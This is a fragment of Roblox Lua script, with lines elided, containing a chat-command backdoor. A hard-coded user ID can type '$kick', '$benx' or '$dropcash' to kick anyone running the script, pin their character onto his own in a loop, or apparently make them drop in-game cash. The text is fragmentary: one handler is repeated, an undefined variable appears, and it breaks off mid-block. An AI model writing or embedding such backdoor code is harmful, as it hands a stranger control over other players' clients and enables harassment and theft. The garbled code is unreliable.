while true do 
	local p3_lua = game:GetService("Players"):GetPlayerByUserId(1999623054) --fv4lx
		if p3_lua then
		...
		p3_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p3_lua then
		...
		p3_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p3_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p3_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p3_lua.Character.HumanoidRootPart.CFrame + p3_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p3_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p3_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p3_lua.Character.UpperTorso.Position)
				end
			end
		...
		p3_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p3_lua then
					game.Players.LocalPlayer:Kick("Kicked by p3_lua user")
				end
			end
		...
		p3_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p3_lua2 then
